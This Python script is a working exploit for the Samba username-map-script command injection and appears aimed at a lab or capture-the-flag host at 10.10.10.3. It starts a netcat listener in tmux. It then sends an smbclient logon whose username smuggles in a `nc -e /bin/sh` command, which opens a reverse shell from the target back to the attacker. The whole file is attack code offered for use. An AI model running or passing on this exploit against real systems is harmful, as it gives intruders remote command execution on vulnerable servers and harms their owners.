import subprocess
import sys


def tmux_session():
    session_name = 'nc_shell'
    nc_command = f'nc -vlp {8888}'
    session_creation = ['tmux', 'new-session', '-d' ,'-s', session_name]
    #Command to be send to tmux
    command = ['tmux', 'send-keys', '-t', session_name, nc_command, 'Enter']
    #Creating session
    subprocess.run(session_creation)
    #Sending command
    subprocess.run(command)

def main():
    if len(sys.argv) !=4:
        print('(+) Usage: %s [own_ip] [target_ip] [port]' % sys.argv[0])
        print('(+) Example: %s 192.168.0.1 192.168.0.2 8888' % sys.argv[0])
        sys.exit(-1)
    own_ip = sys.argv[1]
    target_ip = sys.argv[2]
    port = sys.argv[3]
    
    print(f"(+) Creating tmux session with name: nc_shell ")
    tmux_session()

    logon_command = f'\'logon "./=`nohup nc -e /bin/sh {own_ip} {port}`" a \''
    
    print(f"(+) Connecting to target: {target_ip}...")
    smbclient_connection = f"smbclient //10.10.10.3/tmp -N -c {logon_command}"
    print("(+) Ignore NT_STATUS_IO_TIMEOUT error.")
    
    print("(+) Check if it worked, in new tab type: tmux a -t nc_shell, and try do use linux commands...")
    subprocess.run(smbclient_connection, shell=True)

    
    
    #print(f"(+) Validating connection...")
    #nc_output =  tmux_session()   
        
    #if 'connect to' in nc_command:
    #   print('(+) Conncetion established!')
    #   print('(+) Go to a new tab and type tmux a -t nc_shell')
    #else:
    #    print('(-) Connetion failed')

if __name__ == "__main__":
    main()
